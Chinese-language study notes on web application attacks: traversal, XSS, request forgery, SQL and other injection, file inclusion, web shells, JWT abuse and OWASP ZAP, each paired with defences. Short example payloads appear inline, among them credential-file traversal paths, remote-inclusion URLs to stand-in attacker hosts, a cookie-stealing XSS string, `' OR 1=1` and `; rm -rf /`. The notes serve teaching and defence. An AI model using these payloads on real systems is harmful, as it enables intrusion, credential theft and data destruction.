# 網頁應用程式攻擊

## 網頁應用程式攻擊概述

- **Web Application Attacks**（網頁應用程式攻擊）：透過利用網頁應用程式中的漏洞來竊取資料、執行未授權操作或使服務中斷的攻擊手法。
  - 這些攻擊利用程式碼、邏輯或設計中的缺陷。

## 攻擊類型

- **Directory Traversal**（目錄遍歷）：利用安全驗證不足的漏洞訪問預期目錄以外的檔案或目錄。
  - 相關工具：Gobuster、DirBuster、WP Scan（WordPress專用）

- **Cross-Site Scripting (XSS)**（跨站腳本攻擊）：一種注入式攻擊，攻擊者將惡意腳本注入到受信任網站的內容中。
  - 這使攻擊者能在使用者的瀏覽器中執行惡意腳本。

- **Request Forgeries**（請求偽造）：
  - **Cross-Site Request Forgery (CSRF)**（跨站請求偽造）：欺騙使用者提交非預期的惡意請求。
  - **Server-Side Request Forgery (SSRF)**（伺服器端請求偽造）：操控伺服器執行非預期的請求。
    - 可能導致：顯示為來自組織的惡意攻擊、未授權訪問敏感配置、內部端口掃描、攻擊鏈等問題。
    - SSRF不僅限於HTTP協議，還可使用不同協議（如FTP、SMB、SMTP等）和方案（如`file://`、`phar://`等）。

- **SQL Injection**（SQL注入）：利用SQL查詢漏洞，讓攻擊者能夠干擾應用程式對資料庫的查詢。
  - 相關工具：Burp Suite、SQLMap

- **Injection Attacks**（注入攻擊）：
  - **XML Injection**（XML注入）
  - **Command Injection**（命令注入）：利用接受不受信任資料的Web應用程式漏洞。
  - **Server-Side Template Injection**（伺服器端模板注入）
  - **Code Injection**（程式碼注入）：一種攻擊方式，將被解釋/執行的程式碼注入應用程式中。

- **File Inclusions**（檔案包含）：
  - **Local File Inclusion (LFI)**（本地檔案包含）
  - **Remote File Inclusion (RFI)**（遠端檔案包含）
  - 攻擊者透過網頁應用程式將檔案添加到Web伺服器中。

- **Arbitrary Code Execution**（任意程式碼執行）：攻擊者遠端執行程式碼以控制或中斷服務。

- **Web Application Session Hijacking**（網頁應用程式會話劫持）：利用會話控制機制以假冒其他使用者的身份。

- **API Abuse**（API濫用）：利用安全性不佳的API訪問不應該被訪問的後端資訊。
  - 相關工具：Postman

- **Web Application Testing Tools**（網頁應用程式測試工具）：
  - **OWASP ZAP**：用於在開發和測試階段尋找Web應用程式漏洞的工具。

# 目錄遍歷攻擊

- **Directory Traversal Attack**（目錄遍歷攻擊）：一種注入攻擊，用於獲取對網站文檔根目錄之外的文件、目錄或命令的存取權限。
  - 也被稱為路徑遍歷（Path Traversal）
  - 攻擊者試圖透過導航到網站根目錄之外來存取敏感檔案

- **Web Document Root Directory**（網站文檔根目錄）：包含網站所有文件的特定資料夾（簡單來說就是項目部署/開發目錄）。
  - 與作業系統的根目錄不同
  - 通常是根目錄下的一個子目錄，例如 Linux 上常見的 `/var/www`

- **../（雙點符號）**：在目錄遍歷攻擊中用來向上導航目錄結構。
  - 每次使用 `../` 會使目錄層級上升一級
  - 在 Linux/Unix 系統中使用 `/`（正斜線）
  - 在 Windows 系統中使用 `\`（反斜線）

- **%2E%2E%2F**：`../` 的 URL 編碼形式，用於繞過輸入驗證。
  - 攻擊者常用編碼字符來避開安全過濾機制

- **Null Byte**（空字節）：`%00` 是空字符的 URL 編碼形式。
  - 用於繞過服務器端輸入驗證機制
  - 可用來終止字符串，特別是在 C 和 C++ 等語言中
  - 在目錄遍歷攻擊中，`%00` 後的內容會被作業系統忽略

- **File Inclusion**（文件包含）：利用網頁應用程式漏洞來執行或讀取伺服器上的文件。
  - **Remote File Inclusion (RFI)**（遠端文件包含）：執行來自外部網站的腳本
  - **Local File Inclusion (LFI)**（本地文件包含）：執行已存在於伺服器上的文件

- **防範目錄遍歷攻擊的方法**：
  - 適當配置服務器權限，使網頁用戶無法讀取網站根目錄以外的內容
  - 實施輸入驗證和淨化，過濾掉 `../` 等有害字符
  - 防範編碼字符和空字節注入

- **攻擊案例**：
  - 使用 `../../../etc/shadow` 來讀取 Linux 系統密碼哈希文件
  - 利用 `/login.php?user=http://malware.bad/malicious.php` 進行遠端文件包含
  - 使用 `/login.php?user=../../Windows/system32/cmd.exe%00` 執行 Windows 命令提示字元

- **Null Byte Injection**（空字節注入）：主動利用技術，通過添加 URL 編碼的空字節字符（`%00`）來繞過安全檢查過濾器

- **UNC (Universal Naming Convention)**（通用命名慣例）：指定網路資源位置的標準格式，常用於 Windows 環境，但也被其他作業系統支援 

## 相關工具

- **Gobuster**（Gobuster）：一款以 go 實做的目錄遍歷工具，用於探測目錄結構和文件包含漏洞
- **DirBuster**（DirBuster）：一款以 java 實做的目錄遍歷工具，用於探測目錄結構和文件包含漏洞
- **WP Scan**（WP Scan）：WordPress專用的目錄遍歷工具，用於探測WordPress網站中的目錄結構和文件包含漏洞

# 跨站腳本攻擊

- **Cross-Site Scripting（跨站腳本攻擊）**：簡稱XSS，是一種將惡意腳本注入到受信任網站中，設計用來攻擊瀏覽該網站的客戶端用戶的攻擊手法。
    - 允許攻擊者繞過瀏覽器安全模型或信任區域
    - 目標是讓用戶執行惡意腳本，繞過正常安全機制
    - 依賴於網站未進行適當的輸入驗證

## XSS攻擊的四個基本步驟

1. 攻擊者識別受信任網站中的輸入驗證漏洞
2. 攻擊者構造URL以執行代碼注入，並想辦法讓用戶點擊
    - 可能通過釣魚郵件、論壇貼文等方式傳播
3. 受信任網站返回包含注入惡意代碼的頁面
    - 用戶看到的內容來自受信任網站，因此不會懷疑
4. 惡意代碼在客戶端瀏覽器中執行
    - 代碼以受信任網站的權限級別運行
    - 瀏覽器相信代碼來自受信任的來源

## XSS攻擊的類型

- **Reflected XSS（反射型/非持久型XSS）**：
    - 攻擊僅發生在用戶點擊惡意鏈接時
    - 攻擊執行一次後停止
    - 屬於服務器端腳本攻擊
    - 範例URL: `diontraining.com/search?q=<script type='application/javascript'>alert('xss')</script>`

- **Persistent XSS（持久型XSS）**：
    - 允許攻擊者將代碼插入到受信任網站的後端數據庫
    - 不需要等待用戶點擊鏈接
    - 每當用戶加載頁面或數據庫內容時，都會執行惡意腳本
    - 屬於服務器端腳本攻擊

- **DOM-based XSS（基於DOM的XSS）**：
    - 利用客戶端腳本修改網頁的內容和布局
    - 影響文檔對象模型（Document Object Model）
    - 在客戶端瀏覽器中執行
    - 範例URL: `diontraining.com/index.html#default=<script>alert(document.cookie)</script>`
    - 以用戶登錄權限運行，若管理員執行則攻擊者獲得管理員權限

## XSS攻擊的危害

- 網站篡改：通過注入額外HTML代碼破壞網頁外觀
- 數據竊取：竊取用戶的受保護cookie
- 通信攻擊：攔截輸入到網頁表單的數據
- 惡意軟件分發：在客戶端系統上安裝惡意軟件

## 識別XSS攻擊的技巧

- 如果日誌片段或捕獲的URL中包含script標籤或JavaScript代碼，很可能是跨站腳本攻擊
- 如果看到`document.something`（如`document.cookie`或`document.write`），表示這是基於DOM的XSS攻擊


## 瀏覽器安全模型

- 瀏覽器會假設從受信任站點收到的腳本是安全的
- XSS攻擊正是破壞了這種安全和信任模型
- 沒有這種信任級別，網頁將無法運行腳本，功能將受到嚴重限制

## 與DOM相關的XSS漏洞

- **Document Object Model（文件物件模型）**：是瀏覽器如何顯示和操作網頁內容的規範
- 常見的DOM操作目標：document.cookie（包含用戶會話令牌）
- 危險的DOM操作方法：document.write()

## 防禦措施

- 內容安全策略（Content Security Policy，CSP）：現代瀏覽器內建的安全設置
- 使用nonce可以防止攻擊者注入自己的腳本標籤
- 但對某些DOM XSS漏洞（如當用戶輸入被注入到預先存在的腳本標籤中）的保護不足

# 請求偽造（Request Forgery）攻擊

## 主要類型

- **Request Forgery**（請求偽造）：一種攻擊類型，攻擊者誘騙受害者發出非預期的請求，利用 Web 應用程式對使用者瀏覽器的信任。

## 跨站請求偽造

- **Cross-Site Request Forgery (CSRF)**（跨站請求偽造）：誘騙使用者發出非預期請求的攻擊
  - 用戶在不知情的情況下，在攻擊者能控制的網站中執行操作，實際上是發送請求到另一個用戶可能已使用過的網站（偷偷轉發），該 Web 應用程式會將其視為該用戶的合法請求

- **CSRF 攻擊範例**：
  1. 攻擊者在網站中嵌入惡意連結
  2. 用戶在登入社交媒體帳戶的狀態下點擊連結
  3. 攻擊者取得用戶的會話令牌，可在用戶個人資料中發布未授權內容

- **真實案例**：2009 年 Twitter (現為 X) "Mikeyy" 蠕蟲事件
  - 攻擊者利用 Twitter 漏洞在推文中嵌入惡意 JavaScript 程式碼
  - 用戶瀏覽受影響推文時，腳本自動從其帳戶發布未授權推文擴散蠕蟲

- **CSRF 預防措施**：
  - 使用 Anti-CSRF Token（反 CSRF 令牌）：每個會話唯一，包含於每個請求中
  - 實施 SameSite Cookie 屬性：確保 Cookie 只隨同一站點發起的請求傳送
  - 重要交易需要重新認證：如輸入密碼或使用雙因素認證
  - 滲透測試可使用 Burp Suite 等工具來執行 CSRF 攻擊

## 伺服器端請求偽造

- **Server-Side Request Forgery (SSRF)**（伺服器端請求偽造）：攻擊者誘騙伺服器向非預期位置發出請求
  - 比 CSRF 更危險，可繞過防火牆並存取未直接暴露於網際網路的內部服務
  - 攻擊者可構造包含指向內部系統 URL 的請求，若伺服器處理該請求，可能回傳敏感內部資訊

- **SSRF 攻擊範例**：
  - Web 應用程式從用戶提供的 URL 獲取圖片
  - 攻擊者輸入指向內部伺服器的 URL
  - 可能訪問敏感資料或在該伺服器執行命令

- **真實案例**：Capital One 數據外洩事件，攻擊者利用 SSRF 漏洞存取 AWS 上託管的敏感內部中繼資料服務，最終導致數百萬客戶記錄被竊取

- **SSRF 攻擊類型**：基本的 SSRF 攻擊涉及攻擊者操縱伺服器向內部或外部服務發出直接請求，由於請求源自伺服器，通常可以繞過限制此類訪問的網路安全控制

- **SSRF 預防措施**：
  - 驗證和清理所有可能用於構造請求的用戶輸入
  - 實施網路層控制：防火牆和訪問控制清單，限制伺服器向不受信任位置發出出站請求的能力
  - 僅允許應用程式向受信任域名白名單發出請求
  - 滲透測試可使用 OWASP ZAP (Zed Attack Proxy) 等工具來識別 SSRF 漏洞

## 安全最佳實踐

- 處理請求偽造時：
  - 驗證並清理輸入
  - 使用反 CSRF 令牌保護用戶操作
  - 實施網路控制限制伺服器請求到受信任來源
  - 敏感交易考慮重新認證
  - 這些措施可確保用戶和伺服器的完整性和安全性

- **雲端環境特別考量**：指出 SSRF 攻擊在雲端環境中尤其令人擔憂，因為雲端實例可能有權訪問敏感的中繼資料服務

- **利用方式**：提到攻擊者可以利用 SSRF 掃描內部系統的端口，識別潛在弱點和漏洞

# SQL 注入攻擊

- **SQL（Structured Query Language）**（結構化查詢語言）：用於與資料庫溝通的語言，用來讀取、寫入或搜尋資料庫中的資料。
  - 四個主要操作：SELECT（讀取）、INSERT（寫入）、DELETE（刪除）、UPDATE（更新）

- **SQL 查詢範例**：
  ```sql
  SELECT * FROM users WHERE userID = 'Jason' AND password = 'pass123'
  ```

## 注入攻擊基礎

- **Code Injection**（程式碼注入）：透過資料輸入表單插入額外資訊或代碼，並被應用程式接收處理。

- **SQL Injection**（SQL 注入攻擊）：透過輸入表單向網頁應用程式注入惡意 SQL 查詢。
  - 攻擊者試圖在 SQL 陳述句中插入參數或程式碼來查詢資料庫
  - 注入方式：URL 參數、表單欄位、修改 Cookie、變更 POST 資料、使用 HTTP 標頭

- **SQL 注入的嚴重性**：
  - SQL 注入是影響使用 SQL 資料庫的應用程式的嚴重漏洞
  - 可用於竊取資訊甚至完全控制系統

## SQL 注入攻擊實例

- **常見注入技術**：使用邏輯運算符（特別是 OR 條件）來繞過驗證
  - 例如：在密碼欄位輸入 `' OR 1=1;`

- **注入範例解析**：
  ```sql
  SELECT * FROM users WHERE userID = 'Jason' AND password = '' OR 1=1;'
  ```
  - 注入 `' OR 1=1;` 使查詢始終返回 true，因為 1=1 永遠為真
  - 即使密碼不正確，整個陳述句仍會評估為 true

- **高級注入技術**：
  - 攻擊者可通過 HTTP 標頭（如 Authorization 標頭）注入惡意 SQL 代碼
  - 可能導致遠端程式碼執行（RCE）

## 防禦 SQL 注入

- **輸入驗證與淨化**：
  - 主要防禦方法是驗證和淨化使用者輸入
  - 過濾特殊字元（如引號）和可能的注入模式（如 `something=something`）

- **使用參數化查詢**：
  - 應使用參數化查詢而非直接拼接 SQL 字串，這樣用戶的輸入一率只會作為參數使用

- **Web 應用程式防火牆**：
  - 在客戶端和伺服器之間部署 WAF 可進行輸入淨化
  - 適用於無法修改應用程式代碼的情況

- **其他防禦資源**：
  - [OWASP 測試指南](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html) 提供詳細的測試方法

## 認識 SQL 注入跡象

- **注入指標**：
  - 程式碼中出現引號（'）加上等式表達式（如 1=1）
  - 涉及資料庫的問題通常與 SQL 注入相關

- **變異形式**：
  - 不限於 `1=1`，可以是任何永遠為真的表達式：7=7、15=15、A=A 等

# 注入攻擊（Injection Attacks）

## 基本定義與類型

- **注入攻擊（Injection Attacks）**：當攻擊者能夠傳送惡意資料到應用程式中，而這些資料被作為命令或查詢的一部分處理時所發生的攻擊。
  - 允許攻擊者干擾程式的正常運作
  - 可能導致未授權存取、執行不必要的命令或更改資料
  - 利用應用程式處理不受信任輸入的方式，是嚴重的安全風險

## 主要注入攻擊類型

- **命令注入（Command Injection）**：攻擊者透過易受攻擊的應用程式在主機作業系統上執行任意命令。
  - 當應用程式將不安全的使用者輸入資料傳遞給系統殼層或命令解釋器時可能發生
  - 範例：網頁應用程式允許使用者輸入主機名稱檢查伺服器狀態，攻擊者可能輸入 `; rm -rf /` 刪除所有檔案
  - 預防方法：
    - 驗證和淨化使用者輸入
    - 避免使用包含使用者提供資料的系統命令
    - 使用不需要殼層執行的內建函數作為替代方案

- **伺服器端模板注入（Server-Side Template Injection, SSTI）**：當使用者輸入未經適當驗證就被嵌入伺服器端模板時發生。
  - 許多網頁應用程式使用模板引擎生成動態內容
  - 如果攻擊者能將惡意輸入注入模板引擎，可能執行伺服器上的任意程式碼
  - 可能導致資料竊取、遠端程式碼執行和完全的伺服器入侵
  - 範例：使用 Jinja2 模板引擎的應用程式，攻擊者可能輸入 `7 * 7` 並看到 `49` 作為輸出
  - 預防方法：
    - 在模板中包含使用者輸入前，正確轉義無效字元並驗證輸入
    - 使用支援自動轉義使用者輸入的模板引擎

- **XML 注入（XML Injection）**：攻擊者能夠將惡意 XML 內容插入到處理 XML 資料的應用程式中。
  - 可能導致未授權的資料存取、拒絕服務和任意命令執行
  - **XML 外部實體（XML External Entity, XXE）**：是 XML 中允許在 XML 文件中包含外部資料的功能。
    - 作為 XML 規範的一部分，用於定義 XML 文件中可通過宣告的系統識別符存取本地或遠端內容的儲存單元
    - 當 XML 解析器處理包含外部實體參考的輸入時，可能會無意中暴露敏感資料或執行非預期的操作
  - 範例：處理用戶認證的 XML 資料的網頁服務，攻擊者可能注入惡意 XML 來修改結構繞過認證檢查或引用伺服器上的敏感檔案
  - 預防方法：
    - 確保 XML 解析器設定為忽略外部實體
    - 始終根據結構描述（schema）檢查 XML 輸入
    - 使用設計為抵抗 XML 注入攻擊的庫和框架

## 一般防範措施

- 始終驗證和淨化使用者輸入
- 使用安全的編碼實踐
- 應用框架和庫提供的安全功能
- 定期檢查和測試應用程式以發現注入漏洞

# 檔案包含攻擊（File Inclusion Attack）

- **File Inclusion Attack**（檔案包含攻擊）：當應用程式在包含檔案時，檔案路徑由使用者輸入控制，若未適當驗證或過濾輸入，攻擊者可能包含未授權檔案，導致任意程式碼執行、資料洩漏等惡意活動。

## 主要類型

- **Remote File Inclusion (RFI)**（遠端檔案包含）：當應用程式在未經適當驗證的情況下包含來自外部來源的檔案。
  - 攻擊者可以指定外部檔案的URL，應用程式會包含並執行該檔案
  - 例如：在PHP應用程式中使用 `<?php include($_GET['file']); ?>` 若未驗證 `file` 參數
  - 攻擊範例：攻擊者輸入 `http://evil.com/malicious.php` 作為參數
  - 影響：可能導致遠端程式碼執行、資料竊取等

- **Local File Inclusion (LFI)**（本地檔案包含）：當應用程式在未經適當驗證的情況下包含伺服器上的本地檔案。
  - 與RFI類似，但目標是伺服器上已存在的檔案
  - 攻擊範例：使用目錄遍歷技術，如 `../../../../etc/passwd`
  - 影響：允許讀取敏感檔案如 `/etc/passwd`，導致資訊洩漏
  - 進階利用：若攻擊者能先上傳檔案到伺服器，可結合LFI執行該檔案，實現遠端程式碼執行

## 防護措施

- 避免直接使用使用者提供的輸入於檔案包含函數中
- 使用白名單方式指定允許的檔案或目錄
- 驗證所有使用者輸入確保符合預期值
- 實施安全的編碼實踐以防止目錄遍歷
- 實施強健的檔案上傳安全措施
- 定期審查和測試應用程式是否存在檔案包含漏洞

LFI通常出現在PHP應用程式中，當檔案包含機制基於使用者輸入動態引入檔案時，攻擊者可利用此漏洞讀取系統檔案、訪問應用程式配置，甚至執行惡意代碼。

在[OWASP測試指南](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion)中提到，針對某些PHP版本，攻擊者還可以使用NULL位元組（URL編碼為`%00`）來繞過檔案擴展名限制。

# 任意程式碼執行（Arbitrary Code Execution）

- **Arbitrary Code Execution**（任意程式碼執行）：攻擊者能在目標系統上執行自己的程式碼的一種漏洞
  - 被認為是高度危險的漏洞
  - 可能導致攻擊者完全控制受影響的應用程式或伺服器
  - 常見後果包括：安裝惡意軟體、資料竊取、橫向移動至網路中的其他系統

- **Deserialization Attack**（反序列化攻擊）：當應用程式在無適當驗證的情況下還原序列化資料時發生的攻擊
  - 序列化是將物件轉換成可儲存格式（如JSON）的過程
  - 反序列化是將儲存格式轉回應用程式可用物件的過程
  - 攻擊者可操縱序列化資料，注入惡意物件
  - 常見案例：應用程式還原使用者工作階段時，若未適當檢查輸入，攻擊者可建立含有惡意程式碼的假物件

- **Web Shell**（網頁命令介面）：允許攻擊者透過網頁界面在網頁伺服器上執行命令的腳本
  - 提供攻擊者對伺服器的遠端控制能力
  - 可用於資料外洩、橫向移動和維持持久性存取
  - 通常透過檔案上傳漏洞獲取，例如將惡意腳本上傳到缺乏檔案驗證的應用程式中

- **File Upload Vulnerability**（檔案上傳漏洞）：當應用程式允許上傳檔案但未實施適當安全控制時存在的漏洞
  - 攻擊者可能利用上傳漏洞獲得網頁木馬
  - 若系統僅檢查檔案副檔名或MIME類型而不檢查內容，可能被繞過
  - 常見攻擊技術：雙重副檔名（如`shell.php.jpg`）、空字節注入（如`%00`）、檔案名注入（如`../../../../etc/shadow`）

## 防禦措施

- **對於反序列化攻擊**：
  - 避免對不可信的資料進行反序列化
  - 實施嚴格的輸入驗證

- **對於檔案上傳漏洞**：
  - 徹底驗證所有上傳的檔案（檢查副檔名、MIME類型和內容）
  - 限制檔案上傳的位置
  - 確保可執行檔案不能上傳到透過網頁可存取的目錄
  - 使用網頁應用程式防火牆（WAF）檢測和阻擋惡意檔案上傳嘗試
  - 驗證檔案內容而非僅檢查檔案標頭

- **一般安全建議**：
  - 定期檢查和測試應用程式是否存在上述漏洞
  - 實施最小權限原則
  - 保持系統和應用程式更新

任意程式碼執行漏洞極為嚴重，可能源自於命令注入、SQL注入或跨網站腳本等多種其他漏洞，當這些漏洞被利用以在伺服器上執行命令或程式碼時。每種漏洞都利用了應用程式執行程式碼或命令的能力，操縱它包含攻擊者的有效載荷。

# API 濫用

- **API Abuse**（API 濫用）：指攻擊者以開發者未預期的方式利用 API 功能
  - 常見情況：惡意行為者可能濫用 API 來大量爬取使用者資料
  - 攻擊工具：Burp Suite 或 Postman 等可用來操控 API 呼叫
  - 可能繞過的控制機制：限流或輸入驗證
  - 現實案例：Cambridge Analytica 醜聞涉及 Facebook（現為 Meta）API 的濫用

- **JSON Web Token（JWT）**：用於驗證和授權的無狀態令牌
  - 組成部分：標頭（header）、負載（payload）和簽名（signature）
  - 特性：無狀態，伺服器不需要儲存工作階段資訊
  - 負載內容：使用者身分識別或角色等聲明（claims），通常會編碼（base64）但不會加密

- **JWT Manipulation**（JWT 操縱）：攻擊者竄改或偽造 JWT
  - 常見手法：解碼 JWT、修改負載內容（如將權限從「user」改為「admin」）再重新編碼
  - 實際漏洞：CVE-2015-2951 曾暴露 JWT 函式庫使用弱加密演算法的問題
  - 防護方式：
    - 使用安全的雜湊演算法（如 HS256 或 RS256）簽署 JWT
    - 伺服器必須驗證令牌簽名
    - 設置短期過期時間
    - 定期輪替金鑰

- **Postman**：API 開發的協作平台，可用於設計、測試和除錯 API
  - 支援的請求方法：GET、POST、PUT、DELETE 等
  - 支援的 API 架構：REST、SOAP、GraphQL 等
  - 主要功能：
    - 工作區（Workspaces）：管理不同專案的 API 集合
    - 集合（Collections）：已儲存請求的群組，可添加測試和腳本
    - 請求建構器：設定並提交 HTTP 請求
    - 環境變數：儲存常用的 URL 或參數
    - 自訂腳本：自動化測試，如檢測 SQL 注入攻擊是否成功

- **使用 Postman 進行安全測試的優勢**：
  - 可控環境：自訂標頭、管理 Cookie、微調 HTTP 請求的每個方面
  - 自動化測試：提高滲透測試效率
  - 詳細分析：多種格式查看結果（原始資料、格式化 JSON 等）
  - 易於協作：團隊可共享 API 測試和安全評估結果

# OWASP ZAP

- **OWASP ZAP**（Zed Attack Proxy）：開源的網頁應用程式安全測試工具，專為滲透測試人員設計，用於識別網頁應用程式中的安全弱點
  - 主要功能是作為瀏覽器與網頁應用程式間的代理，可攔截、檢查和操控流量
  - 能夠識別各類弱點，如SQL注入、XSS跨網站腳本攻擊和錯誤配置等

## 掃描模式

- **被動掃描**（Passive Scanning）：當用戶瀏覽網站時自動執行，不發送任何入侵性負載
  - 安全無害，不會改變任何回應內容，適合初步安全評估
  - 可檢測缺失的安全標頭、弱SSL配置等問題
  - 在背景執行，不會減慢探索速度

- **主動掃描**（Active Scanning）：發送特製請求來測試漏洞
  - 更為積極的掃描方式，可能觸發目標系統警報
  - 能測試SQL注入、跨網站腳本等漏洞
  - 建議在受控環境中使用

## 關鍵功能

- **快速啟動自動掃描**（Quick Start Automated Scan）：輸入目標網站URL後自動爬取並掃描漏洞

- **手動探索模式**（Manual Explore）：用戶主動瀏覽應用程式，ZAP在背景監聽和記錄每個請求
  - 特別適用於需要認證或使用複雜表單的應用程式

- **抬頭顯示**（Heads-Up Display, HUD）：在瀏覽器內實時疊加關鍵安全信息
  - 顯示即時警報、脆弱參數和需要進一步探索的區域
  - 在正常互動時提供實時安全反饋

- **爬蟲功能**（Spider & AJAX Spider）：用於爬取傳統和現代網頁應用程式
  - AJAX爬蟲專為處理Angular、React等現代JavaScript框架建構的動態網頁

- **報告生成**：按嚴重性列出漏洞，以清晰可行的方式展示測試結果

- **自動化整合**：可與持續整合（CI）管道集成，實現應用程式的定期自動測試
  - 有助於在開發生命週期早期發現漏洞

## 使用案例

- 測試電子商務網站：設置ZAP爬取站點，然後主動掃描表單輸入、URL參數和隱藏目錄中的漏洞
- 測試銀行客戶門戶：使用HUD查看實時警報，同時正常與門戶互動
- 測試博客評論區的XSS：輸入`<script>alert(信息);</script>`等有效負載，檢查ZAP是否能識別跨站腳本漏洞

## 為何使用OWASP ZAP

- 靈活、易用且具有強大的掃描功能
- 適合初學者和有經驗的測試人員
- 高度可定制，支持自定義攻擊腳本和插件擴展
- 提供全面的工具套件，改善網頁應用程式的安全性
